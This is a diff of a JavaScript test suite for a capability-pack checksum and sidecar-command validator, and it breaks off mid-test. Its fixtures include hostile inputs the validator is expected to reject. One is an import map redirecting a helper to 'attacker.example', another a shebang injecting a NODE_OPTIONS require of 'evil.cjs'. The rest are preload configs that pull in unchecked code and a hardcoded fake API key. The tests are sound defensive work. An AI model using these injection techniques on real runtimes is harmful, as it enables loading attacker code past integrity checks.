@@ -36,6 +36,15 @@ import { fromUtf8, stableJson, toHex } from '../src/core/store.mjs';
 import { MemoryStore } from '../src/stores/memory_store.mjs';
 import { decodeResolutionInputBytes, encodeResolutionInputBytes } from '../src/protocol/world_appliance_wire_codec.mjs';
 
+function captureThrown(fn) {
+  try {
+    fn();
+  } catch (error) {
+    return error;
+  }
+  assert.fail('expected function to throw');
+}
+
 describe('Capability Plane v0.2 core contracts', () => {
   it('validates CapabilityPack semantic identity, checksums, and authority boundaries', async () => {
     const manifest = fixtureCapabilityManifest();
@@ -104,6 +113,190 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [{ path: 'adapter.mjs', checksum: localImportAdapterChecksum }],
       }, { 'adapter.mjs': localImportAdapter }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const localHelper = fromUtf8('export default { ok: true };');
+    const localHelperChecksum = `sha256:${await sha256Hex(localHelper)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      docs: [],
+      checksums: [
+        { path: 'adapter.mjs', checksum: localImportAdapterChecksum },
+        { path: 'helper.mjs', checksum: localHelperChecksum },
+      ],
+    }, { 'adapter.mjs': localImportAdapter, 'helper.mjs': localHelper }), true);
+    const extensionlessLocalImportAdapter = fromUtf8("import helper from './helper'; export const CapabilityDriver = helper;");
+    const extensionlessLocalImportAdapterChecksum = `sha256:${await sha256Hex(extensionlessLocalImportAdapter)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      docs: [],
+      checksums: [
+        { path: 'adapter.mjs', checksum: extensionlessLocalImportAdapterChecksum },
+        { path: 'helper.mjs', checksum: localHelperChecksum },
+      ],
+    }, { 'adapter.mjs': extensionlessLocalImportAdapter, 'helper.mjs': localHelper }), true);
+    const typeScriptExtensionlessLocalImportAdapter = fromUtf8("import helper from './helper'; export const CapabilityDriver = helper;\n");
+    const typeScriptExtensionlessLocalImportAdapterChecksum = `sha256:${await sha256Hex(typeScriptExtensionlessLocalImportAdapter)}`;
+    const extensionlessTypeScriptLocalHelper = fromUtf8('type Helper = { ok: boolean }; export default { ok: true } satisfies Helper;\n');
+    const extensionlessTypeScriptLocalHelperChecksum = `sha256:${await sha256Hex(extensionlessTypeScriptLocalHelper)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'in_process', module: 'adapter.ts', exportName: 'CapabilityDriver' },
+      docs: [],
+      checksums: [
+        { path: 'adapter.ts', checksum: typeScriptExtensionlessLocalImportAdapterChecksum },
+        { path: 'helper', checksum: extensionlessTypeScriptLocalHelperChecksum },
+      ],
+    }, { 'adapter.ts': typeScriptExtensionlessLocalImportAdapter, helper: extensionlessTypeScriptLocalHelper }), true);
+    const javaScriptAdapterImportingExtensionlessTypeScriptHelper = fromUtf8("import helper from './helper'; export const CapabilityDriver = helper;\n");
+    const javaScriptAdapterImportingExtensionlessTypeScriptHelperChecksum = `sha256:${await sha256Hex(javaScriptAdapterImportingExtensionlessTypeScriptHelper)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      docs: [],
+      checksums: [
+        { path: 'adapter.mjs', checksum: javaScriptAdapterImportingExtensionlessTypeScriptHelperChecksum },
+        { path: 'helper', checksum: extensionlessTypeScriptLocalHelperChecksum },
+      ],
+    }, { 'adapter.mjs': javaScriptAdapterImportingExtensionlessTypeScriptHelper, helper: extensionlessTypeScriptLocalHelper }), true);
+    const extensionlessCredentialHelper = fromUtf8('const API_KEY = "supersecret123"; export default API_KEY;\n');
+    const extensionlessCredentialHelperChecksum = `sha256:${await sha256Hex(extensionlessCredentialHelper)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        docs: [],
+        checksums: [
+          { path: 'adapter.mjs', checksum: javaScriptAdapterImportingExtensionlessTypeScriptHelperChecksum },
+          { path: 'helper', checksum: extensionlessCredentialHelperChecksum },
+        ],
+      }, { 'adapter.mjs': javaScriptAdapterImportingExtensionlessTypeScriptHelper, helper: extensionlessCredentialHelper }),
+      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
+    );
+    const directoryImportAdapter = fromUtf8("import helper from './helper/'; export const CapabilityDriver = helper;");
+    const directoryImportAdapterChecksum = `sha256:${await sha256Hex(directoryImportAdapter)}`;
+    const externalIndexHelper = fromUtf8("import fs from 'node:fs'; export default fs;");
+    const externalIndexHelperChecksum = `sha256:${await sha256Hex(externalIndexHelper)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        docs: [],
+        checksums: [
+          { path: 'adapter.mjs', checksum: directoryImportAdapterChecksum },
+          { path: 'helper.mjs', checksum: localHelperChecksum },
+          { path: 'helper/index.mjs', checksum: externalIndexHelperChecksum },
+        ],
+      }, {
+        'adapter.mjs': directoryImportAdapter,
+        'helper.mjs': localHelper,
+        'helper/index.mjs': externalIndexHelper,
+      }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    const nativeImportAdapter = fromUtf8("import addon from './addon.node'; export const CapabilityDriver = addon;");
+    const nativeImportAdapterChecksum = `sha256:${await sha256Hex(nativeImportAdapter)}`;
+    const nativeAddon = new Uint8Array([0, 1, 2, 3]);
+    const nativeAddonChecksum = `sha256:${await sha256Hex(nativeAddon)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        docs: [],
+        checksums: [
+          { path: 'adapter.mjs', checksum: nativeImportAdapterChecksum },
+          { path: 'addon.node', checksum: nativeAddonChecksum },
+        ],
+      }, { 'adapter.mjs': nativeImportAdapter, 'addon.node': nativeAddon }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    const nestedLocalImportAdapter = fromUtf8("import helper from './helper.mjs'; export const CapabilityDriver = helper;");
+    const nestedLocalImportAdapterChecksum = `sha256:${await sha256Hex(nestedLocalImportAdapter)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { ...manifest.adapter, module: 'dir/adapter.mjs' },
+        docs: [],
+        checksums: [
+          { path: 'dir/adapter.mjs', checksum: nestedLocalImportAdapterChecksum },
+          { path: './helper.mjs', checksum: localHelperChecksum },
+        ],
+      }, { 'dir/adapter.mjs': nestedLocalImportAdapter, './helper.mjs': localHelper }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { ...manifest.adapter, module: 'dir/adapter.mjs' },
+      docs: [],
+      checksums: [
+        { path: 'dir/adapter.mjs', checksum: nestedLocalImportAdapterChecksum },
+        { path: 'dir/helper.mjs', checksum: localHelperChecksum },
+      ],
+    }, { 'dir/adapter.mjs': nestedLocalImportAdapter, 'dir/helper.mjs': localHelper }), true);
+    const externalLocalHelper = fromUtf8("import fs from 'node:fs'; export default fs;");
+    const externalLocalHelperChecksum = `sha256:${await sha256Hex(externalLocalHelper)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        docs: [],
+        checksums: [
+          { path: 'adapter.mjs', checksum: localImportAdapterChecksum },
+          { path: 'helper.mjs', checksum: externalLocalHelperChecksum },
+        ],
+      }, { 'adapter.mjs': localImportAdapter, 'helper.mjs': externalLocalHelper }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        docs: [],
+        checksums: [
+          { path: 'adapter.mjs', checksum: extensionlessLocalImportAdapterChecksum },
+          { path: 'helper.mjs', checksum: localHelperChecksum },
+          { path: 'helper.ts', checksum: externalLocalHelperChecksum },
+        ],
+      }, { 'adapter.mjs': extensionlessLocalImportAdapter, 'helper.mjs': localHelper, 'helper.ts': externalLocalHelper }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        docs: [],
+        checksums: [
+          { path: 'adapter.mjs', checksum: extensionlessLocalImportAdapterChecksum },
+          { path: 'helper.mjs', checksum: localHelperChecksum },
+          { path: './helper.ts', checksum: externalLocalHelperChecksum },
+        ],
+      }, { 'adapter.mjs': extensionlessLocalImportAdapter, 'helper.mjs': localHelper, './helper.ts': externalLocalHelper }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    const typeScriptJsImportAdapter = fromUtf8("import helper from './helper.js'; export const driver = helper;");
+    const typeScriptJsImportAdapterChecksum = `sha256:${await sha256Hex(typeScriptJsImportAdapter)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { ...manifest.adapter, module: 'adapter.ts' },
+      docs: [],
+      checksums: [
+        { path: 'adapter.ts', checksum: typeScriptJsImportAdapterChecksum },
+        { path: 'helper.ts', checksum: localHelperChecksum },
+      ],
+    }, { 'adapter.ts': typeScriptJsImportAdapter, 'helper.ts': localHelper }), true);
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { ...manifest.adapter, module: 'adapter.ts' },
+      docs: [],
+      checksums: [
+        { path: 'adapter.ts', checksum: typeScriptJsImportAdapterChecksum },
+        { path: 'helper.js', checksum: localHelperChecksum },
+        { path: 'helper.ts', checksum: externalLocalHelperChecksum },
+      ],
+    }, { 'adapter.ts': typeScriptJsImportAdapter, 'helper.js': localHelper, 'helper.ts': externalLocalHelper }), true);
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { ...manifest.adapter, module: 'adapter.ts' },
+        docs: [],
+        checksums: [
+          { path: 'adapter.ts', checksum: typeScriptJsImportAdapterChecksum },
+          { path: 'helper.ts', checksum: externalLocalHelperChecksum },
+        ],
+      }, { 'adapter.ts': typeScriptJsImportAdapter, 'helper.ts': externalLocalHelper }),
       { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
     );
     const bareImportAdapter = fromUtf8("const helper = await import('helper-package'); export const CapabilityDriver = helper.Driver;");
@@ -549,7 +742,16 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [],
       }, {}),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
       () => assertCapabilityPackChecksums({
@@ -572,11 +774,20 @@ describe('Capability Plane v0.2 core contracts', () => {
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
+        adapter: { kind: 'sidecar', command: ['./sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: './sidecar.mjs', checksum: sidecarChecksum }],
+      }, { './sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
         adapter: { kind: 'sidecar', command: ['@scope/adapter.mjs'] },
         docs: [],
         checksums: [],
       }, {}),
-      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
       () => assertCapabilityPackChecksums({
@@ -613,6 +824,12 @@ describe('Capability Plane v0.2 core contracts', () => {
     }, { 'sidecar.mjs': sidecar }), true);
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
+      adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs', '--config', 'prod'] },
+      docs: [],
+      checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+    }, { 'sidecar.mjs': sidecar }), true);
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
       adapter: { kind: 'sidecar', command: ['bin/adapter'] },
       docs: [],
       checksums: [{ path: 'bin/adapter', checksum: sidecarChecksum }],
@@ -626,19 +843,90 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [{ path: './adapter', checksum: extensionlessSidecarImportChecksum }],
       }, { './adapter': extensionlessSidecarImport }),
-      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const extensionlessNodeSidecarImport = fromUtf8("import './helper';\nconsole.log('ready');\n");
+    const extensionlessNodeSidecarImportChecksum = `sha256:${await sha256Hex(extensionlessNodeSidecarImport)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['node', './adapter.mjs'] },
+        docs: [],
+        checksums: [
+          { path: './adapter.mjs', checksum: extensionlessNodeSidecarImportChecksum },
+          { path: './helper.mjs', checksum: sidecarChecksum },
+        ],
+      }, { './adapter.mjs': extensionlessNodeSidecarImport, './helper.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const nodeSidecarWithIgnoredBunShebangImport = fromUtf8("#!/usr/bin/env bun\nimport './helper';\nconsole.log('ready');\n");
+    const nodeSidecarWithIgnoredBunShebangImportChecksum = `sha256:${await sha256Hex(nodeSidecarWithIgnoredBunShebangImport)}`;
+    const nodeIgnoredBunShebangTypeScriptHelper = fromUtf8('export const helper: boolean = true;\n');
+    const nodeIgnoredBunShebangTypeScriptHelperChecksum = `sha256:${await sha256Hex(nodeIgnoredBunShebangTypeScriptHelper)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['node', './adapter.mjs'] },
+        docs: [],
+        checksums: [
+          { path: './adapter.mjs', checksum: nodeSidecarWithIgnoredBunShebangImportChecksum },
+          { path: './helper.ts', checksum: nodeIgnoredBunShebangTypeScriptHelperChecksum },
+        ],
+      }, { './adapter.mjs': nodeSidecarWithIgnoredBunShebangImport, './helper.ts': nodeIgnoredBunShebangTypeScriptHelper }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
     );
     const typeScriptSidecarImport = fromUtf8("import './helper.ts';\nconsole.log('ready');\n");
     const typeScriptSidecarImportChecksum = `sha256:${await sha256Hex(typeScriptSidecarImport)}`;
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
-        adapter: { kind: 'sidecar', command: ['deno', 'run', './adapter.ts'] },
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', './adapter.ts'] },
         docs: [],
         checksums: [{ path: './adapter.ts', checksum: typeScriptSidecarImportChecksum }],
       }, { './adapter.ts': typeScriptSidecarImport }),
-      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
     );
+    const typeScriptSidecar = fromUtf8('type Payload = { ok: boolean };\nconst payload: Payload = { ok: true };\nconsole.log(payload.ok);\n');
+    const typeScriptSidecarChecksum = `sha256:${await sha256Hex(typeScriptSidecar)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', './adapter.ts'] },
+      docs: [],
+      checksums: [{ path: './adapter.ts', checksum: typeScriptSidecarChecksum }],
+    }, { './adapter.ts': typeScriptSidecar }), true);
+    const typeScriptSecretSidecar = fromUtf8('API_KEY=supersecret123\n');
+    const typeScriptSecretSidecarChecksum = `sha256:${await sha256Hex(typeScriptSecretSidecar)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', './adapter.ts'] },
+        docs: [],
+        checksums: [{ path: './adapter.ts', checksum: typeScriptSecretSidecarChecksum }],
+      }, { './adapter.ts': typeScriptSecretSidecar }),
+      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', './adapter.ts'] },
+        docs: [],
+        checksums: [{ path: './adapter.ts', checksum: typeScriptSidecarChecksum }],
+      }, { './adapter.ts': typeScriptSidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const nestedSidecarImport = fromUtf8("import '../helper.mjs';\nconsole.log('ready');\n");
+    const nestedSidecarImportChecksum = `sha256:${await sha256Hex(nestedSidecarImport)}`;
+    const rootHelper = fromUtf8('export const helper = true;\n');
+    const rootHelperChecksum = `sha256:${await sha256Hex(rootHelper)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['bun', 'dir/adapter.mjs'] },
+      docs: [],
+      checksums: [
+        { path: 'dir/adapter.mjs', checksum: nestedSidecarImportChecksum },
+        { path: './helper.mjs', checksum: rootHelperChecksum },
+      ],
+    }, { 'dir/adapter.mjs': nestedSidecarImport, './helper.mjs': rootHelper }), true);
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
       adapter: { kind: 'sidecar', command: ['bin/adapter', '--config=config.json'] },
@@ -648,12 +936,139 @@ describe('Capability Plane v0.2 core contracts', () => {
         { path: 'config.json', checksum: sidecarChecksum },
       ],
     }, { 'bin/adapter': sidecar, 'config.json': sidecar }), true);
+    const extensionlessSidecarExternalImport = fromUtf8("#!/usr/bin/env bun\nimport 'node:fs';\n");
+    const extensionlessSidecarExternalImportChecksum = `sha256:${await sha256Hex(extensionlessSidecarExternalImport)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+        docs: [],
+        checksums: [{ path: 'bin/adapter', checksum: extensionlessSidecarExternalImportChecksum }],
+      }, { 'bin/adapter': extensionlessSidecarExternalImport }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    const extensionlessShebangPreloadSidecar = fromUtf8("#!/usr/bin/env -S bun --preload ./preload.mjs\nconsole.log('ready');\n");
+    const extensionlessShebangPreloadSidecarChecksum = `sha256:${await sha256Hex(extensionlessShebangPreloadSidecar)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+        docs: [],
+        checksums: [{ path: 'bin/adapter', checksum: extensionlessShebangPreloadSidecarChecksum }],
+      }, { 'bin/adapter': extensionlessShebangPreloadSidecar }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const shebangPreloadExternalImport = fromUtf8("import 'node:fs';\n");
+    const shebangPreloadExternalImportChecksum = `sha256:${await sha256Hex(shebangPreloadExternalImport)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+        docs: [],
+        checksums: [
+          { path: 'bin/adapter', checksum: extensionlessShebangPreloadSidecarChecksum },
+          { path: './preload.mjs', checksum: shebangPreloadExternalImportChecksum },
+        ],
+      }, { 'bin/adapter': extensionlessShebangPreloadSidecar, './preload.mjs': shebangPreloadExternalImport }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    const extensionlessShebangTypeScriptPreloadSidecar = fromUtf8("#!/usr/bin/env -S bun --preload ./preload\nconsole.log('ready');\n");
+    const extensionlessShebangTypeScriptPreloadSidecarChecksum = `sha256:${await sha256Hex(extensionlessShebangTypeScriptPreloadSidecar)}`;
+    const extensionlessShebangTypeScriptPreload = fromUtf8("type Preload = { ready: boolean };\nglobalThis.__preload = { ready: true } satisfies Preload;\n");
+    const extensionlessShebangTypeScriptPreloadChecksum = `sha256:${await sha256Hex(extensionlessShebangTypeScriptPreload)}`;
     assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+      docs: [],
+      checksums: [
+        { path: 'bin/adapter', checksum: extensionlessShebangTypeScriptPreloadSidecarChecksum },
+        { path: './preload', checksum: extensionlessShebangTypeScriptPreloadChecksum },
+      ],
+    }, {
+      'bin/adapter': extensionlessShebangTypeScriptPreloadSidecar,
+      './preload': extensionlessShebangTypeScriptPreload,
+    }), true);
+    const denoShebangConfigSidecar = fromUtf8("#!/usr/bin/env -S deno run --config deno.json\nimport './helper.ts';\n");
+    const denoShebangConfigSidecarChecksum = `sha256:${await sha256Hex(denoShebangConfigSidecar)}`;
+    const denoShebangConfigWithImports = fromUtf8(JSON.stringify({ imports: { './helper.ts': 'https://attacker.example/helper.ts' } }));
+    const denoShebangConfigWithImportsChecksum = `sha256:${await sha256Hex(denoShebangConfigWithImports)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+        docs: [],
+        checksums: [
+          { path: 'bin/adapter', checksum: denoShebangConfigSidecarChecksum },
+          { path: 'deno.json', checksum: denoShebangConfigWithImportsChecksum },
+        ],
+      }, { 'bin/adapter': denoShebangConfigSidecar, 'deno.json': denoShebangConfigWithImports }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const quotedDenoShebangImportMapSidecar = fromUtf8('#!/usr/bin/env -S deno run --no-config "--import-map=import_map.json"\nimport \'./helper.ts\';\n');
+    const quotedDenoShebangImportMapSidecarChecksum = `sha256:${await sha256Hex(quotedDenoShebangImportMapSidecar)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+        docs: [],
+        checksums: [{ path: 'bin/adapter', checksum: quotedDenoShebangImportMapSidecarChecksum }],
+      }, { 'bin/adapter': quotedDenoShebangImportMapSidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const envAssignmentBeforeShebangRuntimeSidecar = fromUtf8('#!/usr/bin/env -S NODE_OPTIONS=--require=./evil.cjs node\nconsole.log("ready");\n');
+    const envAssignmentBeforeShebangRuntimeSidecarChecksum = `sha256:${await sha256Hex(envAssignmentBeforeShebangRuntimeSidecar)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+        docs: [],
+        checksums: [{ path: 'bin/adapter', checksum: envAssignmentBeforeShebangRuntimeSidecarChecksum }],
+      }, { 'bin/adapter': envAssignmentBeforeShebangRuntimeSidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const extensionlessTypeScriptSidecar = fromUtf8("#!/usr/bin/env bun\ntype Payload = { ok: boolean };\nimport './helper';\nconst payload: Payload = { ok: true };\nconsole.log(payload.ok);\n");
+    const extensionlessTypeScriptSidecarChecksum = `sha256:${await sha256Hex(extensionlessTypeScriptSidecar)}`;
+    const extensionlessTypeScriptHelper = fromUtf8("#!/usr/bin/env bun\ntype Helper = { ready: boolean };\nexport const helper: Helper = { ready: true };\n");
+    const extensionlessTypeScriptHelperChecksum = `sha256:${await sha256Hex(extensionlessTypeScriptHelper)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['bin/adapter'] },
+      docs: [],
+      checksums: [
+        { path: 'bin/adapter', checksum: extensionlessTypeScriptSidecarChecksum },
+        { path: 'bin/helper', checksum: extensionlessTypeScriptHelperChecksum },
+      ],
+    }, { 'bin/adapter': extensionlessTypeScriptSidecar, 'bin/helper': extensionlessTypeScriptHelper }), true);
+    const extensionlessBunTypeScriptSidecar = fromUtf8("type Payload = { ok: boolean };\nimport './helper';\nconst payload: Payload = { ok: true };\nconsole.log(payload.ok);\n");
+    const extensionlessBunTypeScriptSidecarChecksum = `sha256:${await sha256Hex(extensionlessBunTypeScriptSidecar)}`;
+    const extensionlessBunTypeScriptHelper = fromUtf8("type Helper = { ready: boolean };\nexport const helper: Helper = { ready: true };\n");
+    const extensionlessBunTypeScriptHelperChecksum = `sha256:${await sha256Hex(extensionlessBunTypeScriptHelper)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['bun', 'bin/adapter'] },
+      docs: [],
+      checksums: [
+        { path: 'bin/adapter', checksum: extensionlessBunTypeScriptSidecarChecksum },
+        { path: 'bin/helper', checksum: extensionlessBunTypeScriptHelperChecksum },
+      ],
+    }, { 'bin/adapter': extensionlessBunTypeScriptSidecar, 'bin/helper': extensionlessBunTypeScriptHelper }), true);
+    const binarySidecar = new Uint8Array([0, 159, 146, 150]);
+    const binarySidecarChecksum = `sha256:${await sha256Hex(binarySidecar)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['bin/native-adapter'] },
+      docs: [],
+      checksums: [{ path: 'bin/native-adapter', checksum: binarySidecarChecksum }],
+    }, { 'bin/native-adapter': binarySidecar }), true);
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
       ...manifest,
       adapter: { kind: 'sidecar', command: ['@scope/adapter.mjs'] },
       docs: [],
       checksums: [{ path: '@scope/adapter.mjs', checksum: sidecarChecksum }],
-    }, { '@scope/adapter.mjs': sidecar }), true);
+      }, { '@scope/adapter.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
       adapter: { kind: 'sidecar', command: ['@scope/register'] },
@@ -745,24 +1160,367 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
       }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'config.json', checksum: sidecarChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, 'config.json': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config-file=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const bunConfigWithPreload = fromUtf8('preload = ["./unchecked.ts"]\n');
+    const bunConfigWithPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithPreload)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const bunConfigPreloadImport = fromUtf8("import 'node:fs';\n");
+    const bunConfigPreloadImportChecksum = `sha256:${await sha256Hex(bunConfigPreloadImport)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
+          { path: './unchecked.ts', checksum: bunConfigPreloadImportChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload, './unchecked.ts': bunConfigPreloadImport }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '-c=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '-c', './bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
